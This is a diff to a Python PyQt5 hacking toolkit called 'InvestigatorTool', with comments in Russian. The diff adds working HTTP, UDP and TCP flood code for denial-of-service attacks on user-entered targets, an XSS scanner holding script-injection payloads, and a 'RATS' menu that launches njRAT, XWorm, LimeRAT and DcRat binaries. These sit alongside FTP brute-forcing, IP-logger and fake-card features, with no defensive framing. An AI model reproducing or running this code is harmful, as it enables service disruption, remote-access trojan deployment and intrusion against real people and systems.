@@ -1,10 +1,19 @@
+#BY @thiasoft
+#Coded by RENC(@Xahrvs)
+
+
 import sys
 import random
 import math
 import smtplib
+import sys
 import requests
 import ftplib
 import os
+import socket
+import time
+import phonenumbers
+from phonenumbers import carrier, geocoder, timezone
 import random
 import subprocess
 from bs4 import BeautifulSoup
@@ -13,14 +22,26 @@ import sqlite3
 import pandas as pd
 from PyQt5.QtWidgets import QFileDialog
 from email.mime.text import MIMEText
+from PyQt5.QtCore import QThread, pyqtSignal
+from PyQt5.QtWidgets import (
+    QDoubleSpinBox,
+    QSpinBox,
+    QComboBox,
+    QGridLayout,
+    QHBoxLayout,
+    QFormLayout,
+)
+from PyQt5.QtGui import QIcon, QPixmap
+from urllib.parse import quote, urljoin, urlencode
 from email.mime.multipart import MIMEMultipart
 from PyQt5.QtCore import QThread, pyqtSignal
 from PyQt5.QtWidgets import QApplication, QMainWindow, QWidget, QVBoxLayout, QDialog, QLineEdit, QPushButton, QLabel, QMessageBox, QAction, QTextEdit
 from PyQt5.QtGui import QPainter, QColor, QIcon
 from PyQt5.QtCore import Qt, QTimer, QPointF
-from PyQt5.QtGui import QDesktopServices
+from PyQt5.QtGui import QDesktopServices, QFont
 from PyQt5.QtCore import QUrl
 from playsound import playsound
+
 
 def play_start_music():
     try:
@@ -194,29 +215,86 @@ class WebAnimation(QWidget):
 class AuthenticationDialog(QDialog):
     def __init__(self):
         super().__init__()
+        self.init_ui()
+
+    def init_ui(self):
         self.setWindowTitle("Authentication")
         self.setWindowIcon(QIcon('imgs/key.png'))
-        self.setFixedSize(300, 150)
-        layout = QVBoxLayout()
-        self.key_entry = QLineEdit()
-        layout.addWidget(QLabel("Enter activation key:"))
-        layout.addWidget(self.key_entry)
-        self.submit_button = QPushButton("Submit")
-        self.submit_button.clicked.connect(self.check_activation)
-        layout.addWidget(self.submit_button)
-        self.setLayout(layout)
+        self.setFixedSize(320, 200)
+        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
+
+        main_layout = QVBoxLayout()
+        main_layout.setContentsMargins(20, 20, 20, 20)
+        main_layout.setSpacing(15)
+        self.setLayout(main_layout)
+
+        form_layout = QFormLayout()
+        form_layout.setSpacing(10)
+        main_layout.addLayout(form_layout)
+
+        font = QFont("Arial", 11)
+
+        self.username_entry = self.create_labeled_entry(form_layout, "Enter username:", font)
+
+        self.key_entry = self.create_labeled_entry(form_layout, "Enter activation key:", font, QLineEdit.Password)
+
+        button_layout = QHBoxLayout()
+        button_layout.setSpacing(10)
+        main_layout.addLayout(button_layout)
+
+        self.submit_button = self.create_button("Submit", font, "#4CAF50", self.check_activation)
+        button_layout.addWidget(self.submit_button)
+
+        self.setStyleSheet("background-color: #2c2c2c;")
+
+    def create_labeled_entry(self, layout, label_text, font, echo_mode=None):
+        label = QLabel(label_text)
+        label.setFont(font)
+        label.setAlignment(Qt.AlignRight)
+        label.setStyleSheet("color: #ffffff;")
+
+        entry = QLineEdit()
+        entry.setFont(font)
+        if echo_mode:
+            entry.setEchoMode(echo_mode)
+        entry.setStyleSheet("""
+            border-radius: 10px;
+            border: 1px solid #555555;
+            padding: 5px;
+            background-color: #333333;
+            color: #ffffff;
+        """)
+
+        layout.addRow(label, entry)
+        return entry
+
+    def create_button(self, text, font, background_color, callback):
+        button = QPushButton(text)
+        button.setFont(font)
+        button.setStyleSheet(f"""
+            border-radius: 10px;
+            padding: 5px 10px;
+            background-color: {background_color};
+            color: white;
+        """)
+        button.clicked.connect(callback)
+        return button
 
     def check_activation(self):
-        if self.key_entry.text() == "ThiaSoft2024RE":
+        if self.username_entry.text() and self.key_entry.text() == "@thiasoft":
             self.accept()
         else:
-            QMessageBox.warning(self, "Invalid Key", "Invalid activation key. Please try again.")
+            QMessageBox.warning(self, "Invalid Credentials", "Invalid activation key. Please try again.")
+        
+        self.username_entry.clear()
         self.key_entry.clear()
 
-
+        
+        
 class FTPChecker(QDialog):
     def __init__(self):
         super().__init__()
+        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
         self.setWindowTitle("FTP BruteForce")
         self.setWindowIcon(QIcon('imgs/ftpcheck.png'))
         self.setFixedSize(600, 400)
@@ -316,6 +394,7 @@ class FTPCheckerWorker(QThread):
 class SMTPReporter(QDialog):
     def __init__(self):
         super().__init__()
+        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
         self.setWindowTitle("SMTP Mailer")
         self.setWindowIcon(QIcon('imgs/smtp.png'))
         self.setFixedSize(400, 300)
@@ -375,6 +454,7 @@ class SMTPReporter(QDialog):
 class UserAgentGenerator(QDialog):
     def __init__(self):
         super().__init__()
+        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
         self.setWindowTitle("User-Agent Generator")
         self.setFixedSize(400, 300)
         self.setWindowIcon(QIcon('imgs/useragent.png'))  
@@ -422,6 +502,7 @@ class UserAgentGenerator(QDialog):
 class OSINTDatabaseSearch(QDialog):
     def __init__(self):
         super().__init__()
+        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
         self.setWindowTitle("OSINT Database Search")
         self.setWindowIcon(QIcon('imgs/osintsearch.png'))
         self.setFixedSize(600, 400)
@@ -503,6 +584,7 @@ class OSINTDatabaseSearch(QDialog):
 class ProxyScraper(QDialog):
     def __init__(self):
         super().__init__()
+        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
         self.setWindowTitle("Proxy Scraper")
         self.setWindowIcon(QIcon('imgs/proxy.png'))
         self.setFixedSize(600, 400)
@@ -538,6 +620,7 @@ class ProxyScraper(QDialog):
 class NmapTool(QDialog):
     def __init__(self):
         super().__init__()
+        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
         self.setWindowTitle("Nmap Tool")
         self.setWindowIcon(QIcon('imgs/nmap.png'))
         self.setFixedSize(400, 300)
@@ -590,6 +673,7 @@ class IPLogger(QDialog):
 class SimpleDialog(QDialog):
     def __init__(self, message):
         super().__init__()
+        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
         self.setWindowTitle("About")
         self.setWindowIcon(QIcon('imgs/about.png'))
         self.setFixedSize(300, 150)
@@ -608,6 +692,7 @@ class SimpleDialog(QDialog):
 class IPInfo(QDialog):
     def __init__(self):
         super().__init__()
+        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
         self.setWindowTitle("IP Info")
         self.setWindowIcon(QIcon('imgs/ipinfo.png'))
         self.setFixedSize(400, 300)
@@ -646,9 +731,9 @@ class KadickRunner:
             if not os.path.exists(self.exe_path):
                 raise FileNotFoundError(f"File not found: {self.exe_path}")
 
-            if os.name == 'nt':  # Windows
+            if os.name == 'nt':  #шиндовс
                 subprocess.Popen(['cmd', '/c', 'start', 'cmd', '/k', self.exe_path], shell=True)
-            elif os.name == 'posix':  # Linux and macOS
+            elif os.name == 'posix':  #линух и макос
                 subprocess.Popen(['x-terminal-emulator', '-e', self.exe_path])
             else:
                 raise OSError(f"Unsupported OS: {os.name}")
@@ -662,6 +747,28 @@ class KadickRunner:
     def run(self):
         self.launch_exe()
 
+class NjratMain:
+    def __init__(self):
+        self.app_name = "njrat.exe"
+
+    def launch_app(self):
+        try:
+            app_dir = os.path.abspath('apps')
+            app_path = os.path.join(app_dir, self.app_name)
+            
+            if not os.path.exists(app_path):
+                raise FileNotFoundError(f"File not found: {app_path}")
+            
+            app_path = os.path.normpath(app_path)
+
+            subprocess.Popen(app_path)
+            print(f"Application '{self.app_name}' successfully launched.")
+
+        except FileNotFoundError as e:
+            print(f"Error: {e}")
+
+        except Exception as e:
+            print(f"Error launching application: {e}")
 
 #изначально тут был TeleShadow, но сейчас DcRat
 class TeleShadow:
@@ -686,11 +793,309 @@ class TeleShadow:
 
         except Exception as e:
             print(f"Error launching application: {e}")
-
             
+            
+class Eagly:
+    def __init__(self):
+        self.app_name = "LimeRAT.exe"
+
+    def launch_app(self):
+        try:
+            app_dir = os.path.abspath('apps/LimeRat')
+            app_path = os.path.join(app_dir, self.app_name)
+            
+            if not os.path.exists(app_path):
+                raise FileNotFoundError(f"File not found: {app_path}")
+            
+            app_path = os.path.normpath(app_path)
+
+            subprocess.Popen(app_path)
+            print(f"Application '{self.app_name}' successfully launched.")
+
+        except FileNotFoundError as e:
+            print(f"Error: {e}")
+
+        except Exception as e:
+            print(f"Error launching application: {e}")
+
+
+class Xworm:
+    def __init__(self):
+        self.app_name = "XWorm.exe"
+
+    def launch_app(self):
+        try:
+            app_dir = os.path.abspath('apps/Xworm-V5.6')
+            app_path = os.path.join(app_dir, self.app_name)
+            
+            if not os.path.exists(app_path):
+                raise FileNotFoundError(f"File not found: {app_path}")
+            
+            app_path = os.path.normpath(app_path)
+
+            subprocess.Popen(app_path)
+            print(f"Application '{self.app_name}' successfully launched.")
+
+        except FileNotFoundError as e:
+            print(f"Error: {e}")
+
+        except Exception as e:
+            print(f"Error launching application: {e}")
+
+
+class DoSAttackThread(QThread):
+    log_signal = pyqtSignal(str)
+
+    def __init__(self, target, num_requests, attack_type, delay_range=(0.1, 0.5), timeout=5):
+        super().__init__()
+        self.target = target
+        self.num_requests = num_requests
+        self.attack_type = attack_type
+        self.delay_range = delay_range
+        self.timeout = timeout
+
+    def run(self):
+        if self.attack_type == "HTTP GET Flood":
+            self.http_get_flood()
+        elif self.attack_type == "SYN Flood":
+            self.syn_flood()
+        elif self.attack_type == "UDP Flood":
+            self.udp_flood()
+        elif self.attack_type == "TCP Flood":
+            self.tcp_flood()
+
+    def http_get_flood(self):
+        try:
+            target = self.target.replace("http://", "").replace("https://", "")
+            url = f"http://{target}"
+            for _ in range(self.num_requests):
+                try:
+                    response = requests.get(url, timeout=self.timeout)
+                    self.log_signal.emit(f"HTTP GET request sent to {url}, status code: {response.status_code}")
+                except requests.RequestException as e:
+                    self.log_signal.emit(f"Error occurred: {e}")
+                time.sleep(random.uniform(self.delay_range[0], self.delay_range[1]))
+        except Exception as e:
+            self.log_signal.emit(f"Error occurred: {e}")
+
+    def syn_flood(self):
+        try:
+            target = self.target.replace("http://", "").replace("https://", "")
+            ip = socket.gethostbyname(target)
+            for _ in range(self.num_requests):
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                    s.connect((ip, 80))
+                    s.close()
+                    self.log_signal.emit(f"SYN packet sent to {ip}")
+                except Exception as e:
+                    self.log_signal.emit(f"Error occurred: {e}")
+                time.sleep(random.uniform(self.delay_range[0], self.delay_range[1]))
+        except socket.gaierror as e:
+            self.log_signal.emit(f"DNS resolution failed: {e}")
+        except Exception as e:
+            self.log_signal.emit(f"Error occurred: {e}")
+
+    def udp_flood(self):
+        try:
+            target = self.target.replace("http://", "").replace("https://", "")
+            ip = socket.gethostbyname(target)
+            for _ in range(self.num_requests):
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    s.sendto(b"A" * 1024, (ip, 80))
+                    self.log_signal.emit(f"UDP packet sent to {ip}")
+                except Exception as e:
+                    self.log_signal.emit(f"Error occurred: {e}")
+                time.sleep(random.uniform(self.delay_range[0], self.delay_range[1]))
+        except socket.gaierror as e:
+            self.log_signal.emit(f"DNS resolution failed: {e}")
+        except Exception as e:
+            self.log_signal.emit(f"Error occurred: {e}")
+
+    def tcp_flood(self):
+        try:
+            target = self.target.replace("http://", "").replace("https://", "")
+            ip = socket.gethostbyname(target)
+            for _ in range(self.num_requests):
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.connect((ip, 80))
+                    s.send(b"A" * 1024)
+                    s.close()
+                    self.log_signal.emit(f"TCP packet sent to {ip}")
+                except Exception as e:
+                    self.log_signal.emit(f"Error occurred: {e}")
+                time.sleep(random.uniform(self.delay_range[0], self.delay_range[1]))
+        except socket.gaierror as e:
+            self.log_signal.emit(f"DNS resolution failed: {e}")
+        except Exception as e:
+            self.log_signal.emit(f"Error occurred: {e}")
+
+
+class DoSTool(QDialog):
+    def __init__(self):
+        super().__init__()
+        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
+        self.setWindowTitle("DoS Tool")
+        self.setWindowIcon(QIcon('imgs/dos.png'))
+        self.setFixedSize(400, 300)
+        layout = QVBoxLayout()
+
+        self.target_entry = QLineEdit()
+        self.target_entry.setPlaceholderText("Enter target IP/URL")
+        layout.addWidget(self.target_entry)
+
+        self.requests_entry = QLineEdit()
+        self.requests_entry.setPlaceholderText("Enter number of requests")
+        layout.addWidget(self.requests_entry)
+
+        self.delay_min_entry = QDoubleSpinBox()
+        self.delay_min_entry.setRange(0.01, 10.0)
+        self.delay_min_entry.setSingleStep(0.01)
+        self.delay_min_entry.setValue(0.1)
+        self.delay_min_entry.setSuffix(" seconds (min)")
+        layout.addWidget(self.delay_min_entry)
+
+        self.delay_max_entry = QDoubleSpinBox()
+        self.delay_max_entry.setRange(0.01, 10.0)
+        self.delay_max_entry.setSingleStep(0.01)
+        self.delay_max_entry.setValue(0.5)
+        self.delay_max_entry.setSuffix(" seconds (max)")
+        layout.addWidget(self.delay_max_entry)
+
+        self.timeout_entry = QSpinBox()
+        self.timeout_entry.setRange(1, 60)
+        self.timeout_entry.setValue(5)
+        self.timeout_entry.setSuffix(" seconds (timeout)")
+        layout.addWidget(self.timeout_entry)
+
+        self.attack_type_combo = QComboBox()
+        self.attack_type_combo.addItems(["HTTP GET Flood", "SYN Flood", "UDP Flood"])
+        layout.addWidget(self.attack_type_combo)
+
+        self.start_button = QPushButton("Start DoS Attack")
+        self.start_button.clicked.connect(self.start_dos)
+        layout.addWidget(self.start_button)
+
+        self.result_text = QTextEdit()
+        self.result_text.setReadOnly(True)
+        layout.addWidget(self.result_text)
+
+        self.setLayout(layout)
+
+    def start_dos(self):
+        target = self.target_entry.text()
+        num_requests = self.requests_entry.text()
+        attack_type = self.attack_type_combo.currentText()
+        delay_min = self.delay_min_entry.value()
+        delay_max = self.delay_max_entry.value()
+        timeout = self.timeout_entry.value()
+
+        if not target or not num_requests:
+            QMessageBox.warning(self, "Error", "Please enter a target and number of requests")
+            return
+
+        try:
+            num_requests = int(num_requests)
+        except ValueError:
+            QMessageBox.warning(self, "Error", "Number of requests must be an integer")
+            return
+
+        self.result_text.append(f"Starting {attack_type} on {target} with {num_requests} requests...")
+
+        self.dos_thread = DoSAttackThread(target, num_requests, attack_type, (delay_min, delay_max), timeout)
+        self.dos_thread.log_signal.connect(self.update_log)
+        self.dos_thread.start()
+
+    def update_log(self, message):
+        self.result_text.append(message)
+
+
+class XSSScannerThread(QThread):
+    log_signal = pyqtSignal(str)
+
+    def __init__(self, target_urls):
+        super().__init__()
+        self.target_urls = target_urls
+        self.payloads = [
+            "<script>alert('XSS')</script>",
+            "'><script>alert('XSS')</script>",
+            "<img src=x onerror=alert('XSS')>"
+        ]
+
+    def run(self):
+        for base_url in self.target_urls:
+            for payload in self.payloads:
+                self.log_signal.emit(f"Scanning {base_url} with payload {payload}")
+                try:
+                    url = urljoin(base_url, "/")
+                    query_params = {'q': payload}
+                    encoded_url = url + '?' + urlencode(query_params)
+                    
+                    response = requests.get(encoded_url)
+                    if payload in response.text:
+                        self.log_signal.emit(f"XSS vulnerability found in {base_url} with payload {payload}")
+                    else:
+                        self.log_signal.emit(f"No XSS vulnerability found in {base_url} with payload {payload}")
+                except requests.RequestException as e:
+                    self.log_signal.emit(f"Error scanning {base_url}: {e}")
+
+class XSSScannerApp(QDialog):
+    def __init__(self):
+        super().__init__()
+        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
+        self.setWindowTitle("XSS Scanner")
+        self.setWindowIcon(QIcon('imgs/xss.png'))  
+        self.setFixedSize(400, 300)
+
+        layout = QVBoxLayout()
+
+        self.icon_label = QLabel()
+        pixmap = QPixmap('imgs/xss.png')  
+        self.icon_label.setPixmap(pixmap)
+        self.icon_label.setAlignment(Qt.AlignCenter)
+        layout.addWidget(self.icon_label)
+
+        self.urls_entry = QLineEdit()
+        self.urls_entry.setPlaceholderText("Enter target URLs (comma-separated)")
+        layout.addWidget(self.urls_entry)
+
+        self.scan_button = QPushButton("Start XSS Scan")
+        self.scan_button.clicked.connect(self.start_scan)
+        layout.addWidget(self.scan_button)
+
+        self.result_text = QTextEdit()
+        self.result_text.setReadOnly(True)
+        layout.addWidget(self.result_text)
+
+        self.setLayout(layout)
+
+    def start_scan(self):
+        urls = self.urls_entry.text()
+        if not urls:
+            QMessageBox.warning(self, "Error", "Please enter at least one URL")
+            return
+
+        target_urls = [url.strip() for url in urls.split(",") if url.strip()]
+        if not target_urls:
+            QMessageBox.warning(self, "Error", "Please enter valid URLs")
+            return
+
+        self.result_text.append("Starting XSS scan...")
+
+        self.xss_thread = XSSScannerThread(target_urls)
+        self.xss_thread.log_signal.connect(self.update_log)
+        self.xss_thread.start()
+
+    def update_log(self, message):
+        self.result_text.append(message)
+
 class WebScraper(QDialog):
     def __init__(self):
         super().__init__()
+        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
         self.setWindowTitle("Web Scraper")
         self.setWindowIcon(QIcon('imgs/scraper.png'))
         self.setFixedSize(600, 400)
@@ -746,8 +1151,8 @@ class InvestigatorTool(QMainWindow):
         
         menubar = self.menuBar()
         
-        #Мейн меню
-        mainMenu = menubar.addMenu('Main')
+        #мейн меню
+        mainMenu = menubar.addMenu('MAIN')
         
         showDialogAction = QAction(QIcon('imgs/telegram.png'), 'We on Telegram', self)
         showDialogAction.setShortcut('Ctrl+C')
@@ -769,8 +1174,8 @@ class InvestigatorTool(QMainWindow):
         exitAction.triggered.connect(self.close)
         mainMenu.addAction(exitAction)
         
-        #ТУЛЫ
-        toolsMenu = menubar.addMenu('Tools')
+        #МЕНЮ TOOL
+        toolsMenu = menubar.addMenu('TOOLS')
         smtpAction = QAction(QIcon('imgs/smtp.png'), 'SMTP Mailer', self)
         smtpAction.setShortcut('Ctrl+M')
         smtpAction.triggered.connect(self.show_smtp_reporter)
@@ -780,6 +1185,11 @@ class InvestigatorTool(QMainWindow):
         smtpAction.setShortcut('Ctrl+B')
         smtpAction.triggered.connect(self.show_ftpcheck)
         toolsMenu.addAction(smtpAction)
+        
+        dosAction = QAction(QIcon('imgs/dos.png'), 'DoS Attack', self)
+        dosAction.setShortcut('Ctrl+G')
+        dosAction.triggered.connect(self.show_dos_tool)
+        toolsMenu.addAction(dosAction)
         
         proxyAction = QAction(QIcon('imgs/proxy.png'), 'Proxy Scraper', self)
         proxyAction.setShortcut('Ctrl+P')
@@ -796,24 +1206,45 @@ class InvestigatorTool(QMainWindow):
         showDialogAction.triggered.connect(self.show_qtox)
         toolsMenu.addAction(showDialogAction)
         
-        showDialogAction = QAction(QIcon('imgs/dcrat.png'), 'DCRat', self)
-        showDialogAction.setShortcut('Ctrl+T')
-        showDialogAction.triggered.connect(self.show_teleshadow)
-        toolsMenu.addAction(showDialogAction)
-        
         showDialogAction = QAction(QIcon('imgs/kadick.png'), 'KadickClient', self)
         showDialogAction.setShortcut('Ctrl+K')
         showDialogAction.triggered.connect(self.show_kadick)
         toolsMenu.addAction(showDialogAction)
         
-        nmapAction = QAction(QIcon('imgs/nmap.png'), 'Nmap Tool', self)
+        ratsMenu = menubar.addMenu('RATS')
+        showDialogAction = QAction(QIcon('imgs/dcrat.png'), 'DcRat', self)
+        showDialogAction.setShortcut('Ctrl+T')
+        showDialogAction.triggered.connect(self.show_teleshadow)
+        ratsMenu.addAction(showDialogAction)
+        
+        showDialogAction = QAction(QIcon('imgs/njrat.png'), 'NjRat', self)
+        showDialogAction.setShortcut('Ctrl+J')
+        showDialogAction.triggered.connect(self.show_njrat)
+        ratsMenu.addAction(showDialogAction)
+        
+        showDialogAction = QAction(QIcon('imgs/xworm.png'), 'XWorm', self)
+        showDialogAction.setShortcut('Ctrl+Z')
+        showDialogAction.triggered.connect(self.show_xworm)
+        ratsMenu.addAction(showDialogAction)
+        
+        showDialogAction = QAction(QIcon('imgs/limerat.png'), 'LimeRat', self)
+        showDialogAction.setShortcut('Ctrl+E')
+        showDialogAction.triggered.connect(self.show_eagly)
+        ratsMenu.addAction(showDialogAction)
+        
+        ExploitToolsMenu = menubar.addMenu('SCAN')
+        nmapAction = QAction(QIcon('imgs/nmap.png'), 'Nmap', self)
         nmapAction.setShortcut('Ctrl+N')
         nmapAction.triggered.connect(self.show_nmap_tool)
-        toolsMenu.addAction(nmapAction)
+        ExploitToolsMenu.addAction(nmapAction)
         
+        dosAction = QAction(QIcon('imgs/xss.png'), 'XSS Scan', self)
+        dosAction.setShortcut('Ctrl+V')
+        dosAction.triggered.connect(self.show_xss_tool)
+        ExploitToolsMenu.addAction(dosAction)
         
-        #осинт
-        osintMenu = menubar.addMenu('Osint')
+        #осинт меню
+        osintMenu = menubar.addMenu('OSINT')
         osintAction = QAction(QIcon('imgs/osint.png'), 'OSINT Framework', self)
         osintAction.setShortcut('Ctrl+O')
         osintAction.triggered.connect(self.open_osint_url)
@@ -829,13 +1260,20 @@ class InvestigatorTool(QMainWindow):
         ipInfoAction.triggered.connect(self.show_ip_info)
         osintMenu.addAction(ipInfoAction)
         
+        hlrAction = QAction(QIcon('imgs/hlr.png'), 'HLR Checker', self)
+        hlrAction.setShortcut('Ctrl+H')
+        hlrAction.triggered.connect(self.show_hlr_tool)
+        osintMenu.addAction(hlrAction)
+        
         osintDatabaseSearchAction = QAction(QIcon('imgs/osintsearch.png'), 'Database Search', self)
         osintDatabaseSearchAction.setShortcut('Ctrl+D')
         osintDatabaseSearchAction.triggered.connect(self.show_osint_database_search)
         osintMenu.addAction(osintDatabaseSearchAction)
         
-        #социальное
-        additionalToolsMenu = menubar.addMenu('Social')
+        
+        
+        #социалочка
+        additionalToolsMenu = menubar.addMenu('SOCIAL')
         randomPersonalityAction = QAction(QIcon('imgs/random_personality.png'), 'Random Personality Generator', self)
         randomPersonalityAction.setShortcut('Ctrl+R')
         randomPersonalityAction.triggered.connect(self.show_random_personality)
@@ -850,24 +1288,25 @@ class InvestigatorTool(QMainWindow):
         fakeCardAction.setShortcut('Ctrl+F')
         fakeCardAction.triggered.connect(self.show_fake_card)
         additionalToolsMenu.addAction(fakeCardAction)
-        
+
         auth_dialog = AuthenticationDialog()
         if auth_dialog.exec_() != QDialog.Accepted:
             sys.exit()
-        
+
         self.central_widget = QWidget()
         self.setCentralWidget(self.central_widget)
-        
+
         self.web_animation = WebAnimation()
         layout = QVBoxLayout(self.central_widget)
         layout.addWidget(self.web_animation, stretch=1)
-        
+
         self.show()
 
     def show_dialog(self):
         dialog = SimpleDialog('''Developer - @Xahrvs | Telegram - @thiasoft
                 MADE WITH LOVE ❤️''')
         dialog.exec_()
+        
 
     def show_smtp_reporter(self):
         smtp_reporter = SMTPReporter()
@@ -877,6 +1316,18 @@ class InvestigatorTool(QMainWindow):
         proxy_scraper = ProxyScraper()
         proxy_scraper.exec_()
         
+    def show_njrat(self):
+        njrat = NjratMain()
+        njrat.launch_app()
+    
+    def show_eagly(self):
+        eagly = Eagly()
+        eagly.launch_app()
+        
+    def show_xworm(self):
+        xworm = Xworm()
+        xworm.launch_app()
+    
     def show_teleshadow(self):
         teleshadow = TeleShadow()
         teleshadow.launch_app()
@@ -889,6 +1340,14 @@ class InvestigatorTool(QMainWindow):
     def show_user_agent_generator(self):
         user_agent_dialog = UserAgentGenerator()
         user_agent_dialog.exec_()
+        
+    def show_dos_tool(self):
+        dos_tool = DoSTool()
+        dos_tool.exec_()
+        
+    def show_xss_tool(self):
+        xss_tool = XSSScannerApp()
+        xss_tool.exec_()
 
     def show_nmap_tool(self):
         nmap_tool = NmapTool()
@@ -897,6 +1356,11 @@ class InvestigatorTool(QMainWindow):
     def open_osint_url(self):
         url = "https://osintframework.com/"
         QDesktopServices.openUrl(QUrl(url))
+        
+    def show_hlr_tool(self):
+        url = "https://smsc.ru/testhlr/"
+        QDesktopServices.openUrl(QUrl(url))
+
         
     def show_yt (self):
         url = "https://www.youtube.com/channel/UCMtPxuOaSZgoM4FXXM5yrzg"
@@ -911,7 +1375,7 @@ class InvestigatorTool(QMainWindow):
         url = "https://github.com/qTox/qTox/releases/download/v1.17.6/setup-qtox-x86_64-release.exe"
         QDesktopServices.openUrl(QUrl(url))
 
-#Я ХЗ ШО ЭТО ЗА ГОВНО, НЕ ЧИТАЙТЕ ЭТОТ КОД ПЖ
+# Я ХЗ ШО ЭТО ЗА ГОВНО, НЕ ЧИТАЙТЕ ЭТОТ КОД ПЖ
 
     def show_ip_logger(self):
         url = "https://iplogger.org/ru/location-tracker/"
@@ -950,7 +1414,7 @@ class InvestigatorTool(QMainWindow):
                 self.showFullScreen()
         super().keyPressEvent(event)
 
-
+#я ненавижу в себе все и в ненависти утопаю, а ты прекрасна словно сон, в который я случайно попадаю.
 if __name__ == '__main__':
     app = QApplication(sys.argv)
     app.setStyle('Fusion')
